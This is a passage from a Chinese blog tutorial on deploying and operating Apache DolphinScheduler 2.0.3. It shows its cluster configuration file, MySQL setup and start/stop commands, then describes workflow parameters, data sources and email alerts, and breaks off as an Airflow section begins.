class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># INSTALL MACHINE</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># A comma separated list of machine hostname or IP would be installed DolphinScheduler,</span></span><br><span class="line"><span class="comment"># including master, worker, api, alert. If you want to deploy in pseudo-distributed</span></span><br><span class="line"><span class="comment"># mode, just write a pseudo-distributed hostname</span></span><br><span class="line"><span class="comment"># Example for hostnames: ips="ds1,ds2,ds3,ds4,ds5", Example for IPs: ips="192.168.8.1,192.168.8.2,192.168.8.3,192.168.8.4,192.168.8.5"</span></span><br><span class="line">ips=<span class="string">"hadoop102,hadoop103,hadoop104"</span> </span><br><span class="line"><span class="comment"># 将要部署任一 DolphinScheduler 服务的服务器主机名或 ip 列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Port of SSH protocol, default value is 22. For now we only support same port in all `ips` machine</span></span><br><span class="line"><span class="comment"># modify it if you use different ssh port</span></span><br><span class="line">sshPort=<span class="string">"22"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A comma separated list of machine hostname or IP would be installed Master server, it</span></span><br><span class="line"><span class="comment"># must be a subset of configuration `ips`.</span></span><br><span class="line"><span class="comment"># Example for hostnames: masters="ds1,ds2", Example for IPs: masters="192.168.8.1,192.168.8.2"</span></span><br><span class="line">masters=<span class="string">"hadoop102"</span> </span><br><span class="line"><span class="comment"># master 所在主机名列表，必须是 ips 的子集</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A comma separated list of machine &lt;hostname&gt;:&lt;workerGroup&gt; or &lt;IP&gt;:&lt;workerGroup&gt;.All hostname or IP must be a</span></span><br><span class="line"><span class="comment"># subset of configuration `ips`, And workerGroup have default value as `default`, but we recommend you declare behind the hosts</span></span><br><span class="line"><span class="comment"># Example for hostnames: workers="ds1:default,ds2:default,ds3:default", Example for IPs: workers="192.168.8.1:default,192.168.8.2:default,192.168.8.3:default"</span></span><br><span class="line">workers=<span class="string">"hadoop102:default,hadoop103:default,hadoop104:default"</span> </span><br><span class="line"><span class="comment"># worker主机名及队列，此处的 ip 必须在 ips 列表中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A comma separated list of machine hostname or IP would be installed Alert server, it</span></span><br><span class="line"><span class="comment"># must be a subset of configuration `ips`.</span></span><br><span class="line"><span class="comment"># Example for hostname: alertServer="ds3", Example for IP: alertServer="192.168.8.3"</span></span><br><span class="line">alertServer=<span class="string">"hadoop102"</span></span><br><span class="line"><span class="comment"># 告警服务所在服务器主机名</span></span><br><span class="line"><span class="comment"># A comma separated list of machine hostname or IP would be installed API server, it</span></span><br><span class="line"><span class="comment"># must be a subset of configuration `ips`.</span></span><br><span class="line"><span class="comment"># Example for hostname: apiServers="ds1", Example for IP: apiServers="192.168.8.1"</span></span><br><span class="line">apiServers=<span class="string">"hadoop102"</span></span><br><span class="line"><span class="comment"># api服务所在服务器主机名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A comma separated list of machine hostname or IP would be installed Python gateway server, it</span></span><br><span class="line"><span class="comment"># must be a subset of configuration `ips`.</span></span><br><span class="line"><span class="comment"># Example for hostname: pythonGatewayServers="ds1", Example for IP: pythonGatewayServers="192.168.8.1"</span></span><br><span class="line"><span class="comment"># pythonGatewayServers="ds1" </span></span><br><span class="line"><span class="comment"># 不需要的配置项，可以保留默认值，也可以用 # 注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The directory to install DolphinScheduler for all machine we config above. It will automatically be created by `install.sh` script if not exists.</span></span><br><span class="line"><span class="comment"># Do not set this configuration same as the current path (pwd)</span></span><br><span class="line">installPath=<span class="string">"/opt/module/dolphinscheduler"</span></span><br><span class="line"><span class="comment"># DS 安装路径，如果不存在会创建</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The user to deploy DolphinScheduler for all machine we config above. For now user must create by yourself before running `install.sh`</span></span><br><span class="line"><span class="comment"># script. The user needs to have sudo privileges and permissions to operate hdfs. If hdfs is enabled than the root directory needs</span></span><br><span class="line"><span class="comment"># to be created by this user</span></span><br><span class="line">deployUser=<span class="string">"atguigu"</span></span><br><span class="line"><span class="comment"># 部署用户，任务执行服务是以 sudo -u &#123;linux-user&#125; 切换不同 Linux 用户的方式来实现多租户运行作业，因此该用户必须有免密的 sudo 权限。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The directory to store local data for all machine we config above. Make sure user `deployUser` have permissions to read and write this directory.</span></span><br><span class="line">dataBasedirPath=<span class="string">"/tmp/dolphinscheduler"</span></span><br><span class="line"><span class="comment"># 前文配置的所有节点的本地数据存储路径，需要确保部署用户拥有该目录的读写权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># DolphinScheduler ENV</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># JAVA_HOME, we recommend use same JAVA_HOME in all machine you going to install DolphinScheduler</span></span><br><span class="line"><span class="comment"># and this configuration only support one parameter so far.</span></span><br><span class="line">javaHome=<span class="string">"/opt/module/jdk1.8.0_212"</span></span><br><span class="line"><span class="comment"># JAVA_HOME 路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DolphinScheduler API service port, also this is your DolphinScheduler UI component's URL port, default value is 12345</span></span><br><span class="line">apiServerPort=<span class="string">"12345"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Database</span></span><br><span class="line"><span class="comment"># NOTICE: If database value has special characters, such as `.*[]^$&#123;&#125;\+?|()@#&amp;`, Please add prefix `\` for escaping.</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># The type for the metadata database</span></span><br><span class="line"><span class="comment"># Supported values: ``postgresql``, ``mysql`, `h2``.</span></span><br><span class="line"><span class="comment"># 注意：数据库相关配置的 value 必须加引号，否则配置无法生效</span></span><br><span class="line"></span><br><span class="line">DATABASE_TYPE=<span class="string">"mysql"</span></span><br><span class="line"><span class="comment"># 数据库类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spring datasource url, following &lt;HOST&gt;:&lt;PORT&gt;/&lt;database&gt;?&lt;parameter&gt; format, If you using mysql, you could use jdbc</span></span><br><span class="line"><span class="comment"># string jdbc:mysql://127.0.0.1:3306/dolphinscheduler?useUnicode=true&amp;characterEncoding=UTF-8 as example</span></span><br><span class="line"><span class="comment"># SPRING_DATASOURCE_URL=$&#123;SPRING_DATASOURCE_URL:-"jdbc:h2:mem:dolphinscheduler;MODE=MySQL;DB_CLOSE_DELAY=-1;DATABASE_TO_LOWER=true"&#125;</span></span><br><span class="line">SPRING_DATASOURCE_URL=<span class="string">"jdbc:mysql://hadoop102:3306/dolphinscheduler?useUnicode=true&amp;characterEncoding=UTF-8"</span></span><br><span class="line"><span class="comment"># 数据库 URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spring datasource username</span></span><br><span class="line"><span class="comment"># SPRING_DATASOURCE_USERNAME=$&#123;SPRING_DATASOURCE_USERNAME:-"sa"&#125;</span></span><br><span class="line">SPRING_DATASOURCE_USERNAME=<span class="string">"dolphinscheduler"</span></span><br><span class="line"><span class="comment"># 数据库用户名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spring datasource password</span></span><br><span class="line"><span class="comment"># SPRING_DATASOURCE_PASSWORD=$&#123;SPRING_DATASOURCE_PASSWORD:-""&#125;</span></span><br><span class="line">SPRING_DATASOURCE_PASSWORD=<span class="string">"dolphinscheduler"</span></span><br><span class="line"><span class="comment"># 数据库密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Registry Server</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Registry Server plugin name, should be a substring of `registryPluginDir`, DolphinScheduler use this for verifying configuration consistency</span></span><br><span class="line">registryPluginName=<span class="string">"zookeeper"</span></span><br><span class="line"><span class="comment"># 注册中心插件名称，DS 通过注册中心来确保集群配置的一致性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Registry Server address.</span></span><br><span class="line">registryServers=<span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span></span><br><span class="line"><span class="comment"># 注册中心地址，即 Zookeeper 集群的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Registry Namespace</span></span><br><span class="line">registryNamespace=<span class="string">"dolphinscheduler"</span></span><br><span class="line"><span class="comment"># DS 在 Zookeeper 的结点名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Worker Task Server</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Worker Task Server plugin dir. DolphinScheduler will find and load the worker task plugin jar package from this dir.</span></span><br><span class="line">taskPluginDir=<span class="string">"lib/plugin/task"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># resource storage type: HDFS, S3, NONE</span></span><br><span class="line">resourceStorageType=<span class="string">"HDFS"</span>  </span><br><span class="line"><span class="comment"># 资源存储类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># resource store on HDFS/S3 path, resource file will store to this hdfs path, self configuration, please make sure the directory exists on hdfs and has read write permissions. "/dolphinscheduler" is recommended</span></span><br><span class="line">resourceUploadPath=<span class="string">"/dolphinscheduler"</span></span><br><span class="line"><span class="comment"># 资源上传路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if resourceStorageType is HDFS，defaultFS write namenode address，HA, you need to put core-site.xml and hdfs-site.xml in the conf directory.</span></span><br><span class="line"><span class="comment"># if S3，write S3 address，HA，for example ：s3a://dolphinscheduler，</span></span><br><span class="line"><span class="comment"># Note，S3 be sure to create the root directory /dolphinscheduler</span></span><br><span class="line">defaultFS=<span class="string">"hdfs://hadoop102:8020"</span></span><br><span class="line"><span class="comment"># 默认文件系统</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if resourceStorageType is S3, the following three configuration is required, otherwise please ignore</span></span><br><span class="line">s3Endpoint=<span class="string">"http://192.168.xx.xx:9010"</span></span><br><span class="line">s3AccessKey=<span class="string">"xxxxxxxxxx"</span></span><br><span class="line">s3SecretKey=<span class="string">"xxxxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># resourcemanager port, the default value is 8088 if not specified</span></span><br><span class="line">resourceManagerHttpAddressPort=<span class="string">"8088"</span></span><br><span class="line"><span class="comment"># yarn RM http 访问端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if resourcemanager HA is enabled, please set the HA IPs; if resourcemanager is single node, keep this value empty</span></span><br><span class="line">yarnHaIps=</span><br><span class="line"><span class="comment"># Yarn RM 高可用 ip，若未启用 RM 高可用，则将该值置空</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if resourcemanager HA is enabled or not use resourcemanager, please keep the default value; If resourcemanager is single node, you only need to replace 'yarnIp1' to actual resourcemanager hostname</span></span><br><span class="line">singleYarnIp=<span class="string">"hadoop103"</span></span><br><span class="line"><span class="comment"># Yarn RM 主机名，若启用了 HA 或未启用 RM，保留默认值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># who has permission to create directory under HDFS/S3 root path</span></span><br><span class="line"><span class="comment"># Note: if kerberos is enabled, please config hdfsRootUser=</span></span><br><span class="line">hdfsRootUser=<span class="string">"atguigu"</span></span><br><span class="line"><span class="comment"># 拥有 HDFS 根目录操作权限的用户</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面是如果hdfs开启了验证在操作的</span></span><br><span class="line"><span class="comment"># kerberos config</span></span><br><span class="line"><span class="comment"># whether kerberos starts, if kerberos starts, following four items need to config, otherwise please ignore</span></span><br><span class="line">kerberosStartUp=<span class="string">"false"</span></span><br><span class="line"><span class="comment"># kdc krb5 config file path</span></span><br><span class="line">krb5ConfPath=<span class="string">"<span class="variable">$installPath</span>/conf/krb5.conf"</span></span><br><span class="line"><span class="comment"># keytab username,watch out the @ sign should followd by \\</span></span><br><span class="line">keytabUserName=<span class="string">"hdfs-mycluster\\@ESZ.COM"</span></span><br><span class="line"><span class="comment"># username keytab path</span></span><br><span class="line">keytabPath=<span class="string">"<span class="variable">$installPath</span>/conf/hdfs.headless.keytab"</span></span><br><span class="line"><span class="comment"># kerberos expire time, the unit is hour</span></span><br><span class="line">kerberosExpireTime=<span class="string">"2"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># use sudo or not</span></span><br><span class="line">sudoEnable=<span class="string">"true"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># worker tenant auto create</span></span><br><span class="line">workerTenantAutoCreate=<span class="string">"false"</span></span><br></pre></td></tr></table></figure><h3 id="3-3-初始化数据库">3.3 初始化数据库</h3><p>DolphinScheduler 元数据存储在关系型数据库中，故需创建相应的数据库和用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建数据库</span></span><br><span class="line">CREATE DATABASE dolphinscheduler DEFAULT CHARACTER SET utf8 DEFAULT COLLATE utf8_general_ci;</span><br><span class="line"><span class="comment"># 创建用户</span></span><br><span class="line">CREATE USER <span class="string">'dolphinscheduler'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'dolphinscheduler'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提高密码复杂度或者执行以下命令降低MySQL密码强度级别</span></span><br><span class="line"><span class="built_in">set</span> global validate_password_length=4;</span><br><span class="line"><span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line"><span class="comment"># 赋予用户相应权限</span></span><br><span class="line">GRANT ALL PRIVILEGES ON dolphinscheduler.* TO <span class="string">'dolphinscheduler'</span>@<span class="string">'%'</span>;</span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝MySQL驱动到DolphinScheduler的解压目录下的lib中</span></span><br><span class="line">cp /opt/software/mysql-connector-java-8.0.16.jar lib/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行数据库初始化脚本</span></span><br><span class="line"><span class="comment"># 数据库初始化脚本位于DolphinScheduler解压目录下的script目录中，即/opt/software/ds/apache-dolphinscheduler-2.0.3-bin/script/</span></span><br><span class="line">script/create-dolphinscheduler.sh</span><br></pre></td></tr></table></figure><h3 id="3-4-一键部署DolphinScheduler">3.4 一键部署DolphinScheduler</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动zk</span></span><br><span class="line">zk.sh start</span><br><span class="line"><span class="comment"># 一键部署并启动DolphinScheduler</span></span><br><span class="line">./install.sh</span><br><span class="line"><span class="comment"># 查看DolphinScheduler进程</span></span><br><span class="line"><span class="comment"># ApiApplicationServer</span></span><br><span class="line"><span class="comment"># WorkerServer</span></span><br><span class="line"><span class="comment"># MasterServer</span></span><br><span class="line"><span class="comment"># AlertServer</span></span><br><span class="line"><span class="comment"># LoggerServer</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------</span></span><br><span class="line"><span class="comment"># 访问DolphinScheduler UI</span></span><br><span class="line"><span class="comment"># DolphinScheduler UI地址为http://hadoop102:12345/dolphinscheduler</span></span><br><span class="line"><span class="comment"># 初始用户的用户名为：admin，密码为dolphinscheduler123</span></span><br></pre></td></tr></table></figure><h3 id="3-5-DolphinScheduler启停命令">3.5 DolphinScheduler启停命令</h3><p>安装完后得去<code>/opt/module/dolphinscheduler</code>修改或启停</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一键启停所有服务</span></span><br><span class="line">./bin/start-all.sh</span><br><span class="line">./bin/stop-all.sh</span><br><span class="line"><span class="comment"># 注意同Hadoop的启停脚本进行区分</span></span><br><span class="line"><span class="comment"># 启停 Master</span></span><br><span class="line">./bin/dolphinscheduler-daemon.sh start master-server</span><br><span class="line">./bin/dolphinscheduler-daemon.sh stop master-server</span><br><span class="line"><span class="comment"># 启停 Worker</span></span><br><span class="line">./bin/dolphinscheduler-daemon.sh start worker-server</span><br><span class="line">./bin/dolphinscheduler-daemon.sh stop worker-server</span><br><span class="line"><span class="comment"># 启停 Api</span></span><br><span class="line">./bin/dolphinscheduler-daemon.sh start api-server</span><br><span class="line">./bin/dolphinscheduler-daemon.sh stop api-server</span><br><span class="line"><span class="comment"># 启停 Logger</span></span><br><span class="line">./bin/dolphinscheduler-daemon.sh start logger-server</span><br><span class="line">./bin/dolphinscheduler-daemon.sh stop logger-server</span><br><span class="line"><span class="comment"># 启停 Alert</span></span><br><span class="line">./bin/dolphinscheduler-daemon.sh start alert-server</span><br><span class="line">./bin/dolphinscheduler-daemon.sh stop alert-server</span><br></pre></td></tr></table></figure><h1>二、DolphinScheduler操作</h1><blockquote><p>入门文档可以参考：<a href="https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/guide/quick-start" target="_blank" rel="noopener" title="https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/guide/quick-start">https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/guide/quick-start</a></p></blockquote><h2 id="1、工作流传参">1、工作流传参</h2><blockquote><p><a href="https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D_menu/%E5%8F%82%E6%95%B0_menu" target="_blank" rel="noopener" title="https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/功能介绍_menu/参数_menu">https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/功能介绍_menu/参数_menu</a></p></blockquote><p>DolphinScheduler支持对任务节点进行灵活的传参，任务节点可通过<code>${参数名}</code>引用参数值</p><h3 id="1-1-内置参数">1.1 内置参数</h3><p><strong>基础内置参数</strong></p><table><thead><tr><th><strong>变量名</strong></th><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>system.biz.date</strong></td><td>${system.biz.date}</td><td>定时时间前一天，格式为 yyyyMMdd</td></tr><tr><td><strong>system.biz.curdate</strong></td><td>${system.biz.curdate}</td><td>定时时间，格式为 yyyyMMdd</td></tr><tr><td><strong>system.datetime</strong></td><td>${system.datetime}</td><td>定时时间，格式为 yyyyMMddHHmmss</td></tr></tbody></table><p><strong>衍生内置参数</strong></p><p>可通过衍生内置参数，设置任意格式、任意时间的日期。</p><ul><li>自定义日期格式：可以对 $[yyyyMMddHHmmss] 任意分解组合，如 $[yyyyMMdd], $[HHmmss], $[yyyy-MM-dd]。</li><li>使用 add_months() 函数：该函数用于加减月份， 第一个入口参数为[yyyyMMdd]，表示返回时间的格式 第二个入口参数为月份偏移量，表示加减多少个月</li></ul><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>$[add_months(yyyyMMdd,12*N)]</strong></td><td>后 N 年</td></tr><tr><td><strong>$[add_months(yyyyMMdd,-12*N)]</strong></td><td>前 N 年</td></tr><tr><td><strong>$[add_months(yyyyMMdd,N)]</strong></td><td>后 N 月</td></tr><tr><td><strong>$[add_months(yyyyMMdd,-N)]</strong></td><td>前 N 月</td></tr><tr><td><strong>$[yyyyMMdd+7*N]</strong></td><td>后 N 周</td></tr><tr><td><strong>$[yyyyMMdd-7*N]</strong></td><td>前 N 周</td></tr><tr><td><strong>$[yyyyMMdd+N]</strong></td><td>后 N 天</td></tr><tr><td><strong>$[yyyyMMdd-N]</strong></td><td>前 N 天</td></tr><tr><td><strong>$[HHmmss+N/24]</strong></td><td>后 N 小时</td></tr><tr><td><strong>$[HHmmss-N/24]</strong></td><td>前 N 小时</td></tr><tr><td><strong>$[HHmmss+N/24/60]</strong></td><td>后 N 分钟</td></tr><tr><td><strong>$[HHmmss-N/24/60]</strong></td><td>前 N 分钟</td></tr></tbody></table><p><img src="http://qnypic.shawncoding.top/blog/202404151822486.png" alt></p><p>相关说明</p><ul><li>dt：参数名</li><li>IN：IN 表示局部参数仅能在当前节点使用，OUT 表示局部参数可以向下游传递(目前支持这个特性的任务类型有：Shell、SQL、Procedure；同时若节点之间没有依赖关系，则局部参数无法传递)</li><li>DATE：数据类型，日期</li><li>$[yyyy-MM-dd]：自定义格式的衍生内置参数</li></ul><p>全局参数在工作流定义，本地参数在节点定义，<strong>本地参数 &gt; 全局参数 &gt; 上游任务传递的参数</strong></p><h3 id="1-2-参数传递">1.2 参数传递</h3><ul><li>本地参数 &gt; 全局参数 &gt; 上游任务传递的参数；</li><li>多个上游节点均传递同名参数时，下游节点会优先使用值为非空的参数；</li><li>如果存在多个值为非空的参数，则按照上游任务的完成时间排序，选择完成时间最早的上游任务对应的参数。</li></ul><h2 id="2、引用依赖资源">2、引用依赖资源</h2><p>有些任务需要引用一些额外的资源，例如MR、Spark等任务须引用jar包，Shell任务需要引用其他脚本等。DolphinScheduler提供了资源中心来对这些资源进行统一管理。</p><p>如果需要用到资源上传功能，针对单机可以选择本地文件目录作为上传文件夹(此操作不需要部署 Hadoop)。当然也可以选择上传到 Hadoop or MinIO 集群上，此时则需要有Hadoop (2.6+) 或者 MinIO 等相关环境。本文在部署 DS 集群时指定了文件系统为 HDFS</p><blockquote><p><a href="https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/guide/resource" target="_blank" rel="noopener" title="https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/guide/resource">https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/guide/resource</a></p></blockquote><h2 id="3、数据源配置">3、数据源配置</h2><blockquote><p><a href="https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D_menu/%E6%95%B0%E6%8D%AE%E6%BA%90%E4%B8%AD%E5%BF%83_menu" target="_blank" rel="noopener" title="https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/功能介绍_menu/数据源中心_menu">https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/功能介绍_menu/数据源中心_menu</a></p></blockquote><p>数据源中心支持MySQL、POSTGRESQL、HIVE/IMPALA、SPARK、CLICKHOUSE、ORACLE、SQLSERVER等数据源。此处仅对 HIVE 数据源进行介绍</p><ul><li>数据源：选择HIVE</li><li>数据源名称：输入数据源的名称</li><li>描述：输入数据源的描述，可置空</li><li>IP/主机名：输入连接HIVE的IP</li><li>端口：输入连接HIVE的端口，默认 10000</li><li>用户名：设置连接HIVE的用户名，如果没有配置 HIVE 权限管理，则用户名可以任意，但 HIVE 表数据存储在 HDFS，为了保证对所有表的数据均有操作权限，此处选择 HDFS 超级用户 atguigu（注：HDFS 超级用户名与执行 HDFS 启动命令的 Linux 节点用户名相同）</li><li>密码：设置连接HIVE的密码，如果没有配置 HIVE 权限管理，则密码置空即可</li><li>数据库名：输入连接HIVE的数据库名称</li><li>Jdbc连接参数：用于HIVE连接的参数设置，以JSON形式填写，没有参数可置空</li></ul><p>然后在工作流中可以选择SQL</p><p><img src="http://qnypic.shawncoding.top/blog/202404151822487.png" alt></p><ul><li>节点名称：自定义节点名称</li><li>环境名称：HIVE 执行所需环境</li><li>数据源：类型选择 HIVE，数据源选择上文配置的 HIVE 数据源</li><li>SQL 类型：根据SQL 语句选择，此处选用默认的“查询”即可</li><li>SQL 语句：要执行的 SQL 语句，末尾不能有分号，否则报错：语法错误</li></ul><h2 id="4、告警实例配置">4、告警实例配置</h2><h3 id="4-1-邮箱告警实例配置">4.1 邮箱告警实例配置</h3><blockquote><p><a href="https://help.mail.163.com/faqDetail.do?code=d7a5dc8471cd0c0e8b4b8f4f8e49998b374173cfe9171305fa1ce630d7f67ac21b87735d7227c217" target="_blank" rel="noopener" title="POP3，IMAP，SMTP描述">POP3，IMAP，SMTP描述</a></p></blockquote><p>需要登陆管理员账户</p><ul><li>告警实例名称：在告警组配置时可以选择的告警插件实例名称，用户自定义</li><li>选择插件：选择 Email 则为邮箱告警实例</li><li>收件人：接收方邮箱地址，收件人不需要开启 SMTP 服务</li><li>抄送人：抄送是指用户给收件人发出邮件的同时把该邮件发送给另外的人，收件人之外的收件方都是抄送人，“收件人”可以获知该邮件的所有抄送人；抄送人可以为空。</li><li>mail.smtp.host：邮箱的 SMTP 服务器域名，对于 QQ 邮箱，为 <a href="http://smtp.qq.com" target="_blank" rel="noopener" title="smtp.qq.com">smtp.qq.com</a>。各邮箱的 SMTP 服务器见此链接：<a href="https://blog.csdn.net/wustzjf/article/details/52481309" target="_blank" rel="noopener" title="https://blog.csdn.net/wustzjf/article/details/52481309">https://blog.csdn.net/wustzjf/article/details/52481309</a></li><li>mail.smtp.port：邮箱的 SMTP 服务端口号，主流邮箱均为 25 端口，使用默认值即可</li><li>mail.sender：发件方邮箱地址，需要开启 SMTP 服务</li><li>mail.user：与 mail.sender 保持一致即可</li><li>mail.password：获取的邮箱授权码。未列出的选项保留默认值或默认选项即可</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404151822488.png" alt></p><h3 id="4-2-其他告警">4.2 其他告警</h3><blockquote><p>其他告警可以参考：<a href="https://dolphinscheduler.apache.org/zh-cn/docs/3.0.0" target="_blank" rel="noopener" title="https://dolphinscheduler.apache.org/zh-cn/docs/3.0.0">https://dolphinscheduler.apache.org/zh-cn/docs/3.0.0</a></p></blockquote><p>同时还可以电话告警，这里有个运维平台是一站式集成的，睿象云官网：<a href="https://www.aiops.com/" target="_blank" rel="noopener" title="https://www.aiops.com/">https://www.aiops.com/</a></p><h2 id="5、其他注意事项">5、其他注意事项</h2><p>DolphinScheduler的环境变量是不和主机共享的，默认需要进入<code>/opt/module/dolphinscheduler/conf/env/dolphinscheduler_env.sh</code>进行修改，也可以直接在admin用户下在可视化界面进行创建，创建节点的时候选择即可</p><h1>三、Airflow</h1><h2 id="1、Airflow基本概念">1、Airflow基本概念</h2><blockquote><p>官方网站：<a href="https://airflow.apache.org" target="_blank" rel="noopener" title="https://airflow.apache.org">https://airflow.apache.org</a></p></blockquote><h3 id="1-1-概述-v2">1.1 概述</h3><p>Airflow是一个以编程方式编写，安排和监视工作流的平台。使用Airflow将工作流编写任务的有向无环图（DAG）。Airflow计划程序在遵循指定的依赖项，同时在一组工作线程上执行任务。丰富的命令实用程序使在DAG上执行复杂的调度变的轻而易举。丰富的用户界面使查看生产中正在运行的管道，监视进度以及需要时对问题进行故障排除变的容易</p><h3 id="1-2-名词解释">1.2 